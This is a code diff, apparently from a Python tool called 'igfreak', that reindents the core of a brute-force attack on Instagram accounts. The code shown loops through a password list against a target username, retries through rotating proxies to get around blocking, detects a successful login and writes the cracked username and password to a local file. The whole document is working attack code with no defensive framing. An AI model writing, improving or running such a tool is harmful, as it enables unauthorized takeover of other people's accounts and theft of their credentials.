@@ -673,30 +673,30 @@ def signin(password,username):
         print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
         signin(password,username)
     print(f"{B}[{G}>{B}] {W}Response   : {W}{r.json()['status']}")
-	try:
-	       print(f"{B}[{G}>{B}] {R}Message    : {W}{r.json()['message']}")
-	except KeyError:
-	       pass
-	
-	if r.json()['status'] == "fail":
-	           print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
-	           signin(password,username)
-	           pass
-	else:
-	       pass
-	if  'authenticated":true' in r.text or 'userId' in r.text:
-            rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
-            print(f"{B}[{G}>{B}] {W}Authenticated : {W} True")
-            print(f"{G}[{Y}!{G}] {Y}Password found : {B}",password)
-            strtxt = username+".igfreak"
-            filepass = open(strtxt,"w")
-            filepass.writelines(f"Username : {username}\nPassword : {password}")
-            filepass.close()
-            print()
-            head(f"Saved as : {strtxt}")    
-            return True
-        else:
-            return False
+    try:
+        print(f"{B}[{G}>{B}] {R}Message    : {W}{r.json()['message']}")
+    except KeyError:
+        pass
+    if r.json()['status'] == "fail":
+        print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
+        signin(password,username)
+        pass
+    else:
+        pass
+    if  'authenticated":true' in r.text or 'userId' in r.text:
+        rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
+        print(f"{B}[{G}>{B}] {W}Authenticated : {W} True")
+        print(f"{G}[{Y}!{G}] {Y}Password found : {B}",password)
+        strtxt = username+".igfreak"
+        filepass = open(strtxt,"w")
+        filepass.writelines(f"Username : {username}\nPassword : {password}")
+        filepass.close()
+        print()
+        head(f"Saved as : {strtxt}")
+        return True
+    else:
+        return False
+        
 def read(passlist):
 	import csv
 	crimefile = open(passlist, 'r')
@@ -712,14 +712,14 @@ def Bruteforce(passlist,username):
     head(f"Total passwords to test: {B}"+ str(n_words))
     print(f"\n{R}║{W} Instagram Id = {G}{username}{W}{R} ║")
     for count,password in enumerate(read(passlist)):
-            print(f"\n\n{Y}[{W}{count+1}/{n_words}{Y}]{C} Testing password : {G}"+"".join(password)) 
-            trial = signin("".join(password),username)
-            if trial == True:
-                end = timer()
-                print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	                   	
-                sys.exit()
-            else:
-                continue
+        print(f"\n\n{Y}[{W}{count+1}/{n_words}{Y}]{C} Testing password : {G}"+"".join(password)) 
+        trial = signin("".join(password),username)
+        if trial == True:
+            end = timer()
+            print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	                   	
+            sys.exit()
+        else:
+            continue
     end = timer()
     print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	
     sys.exit()
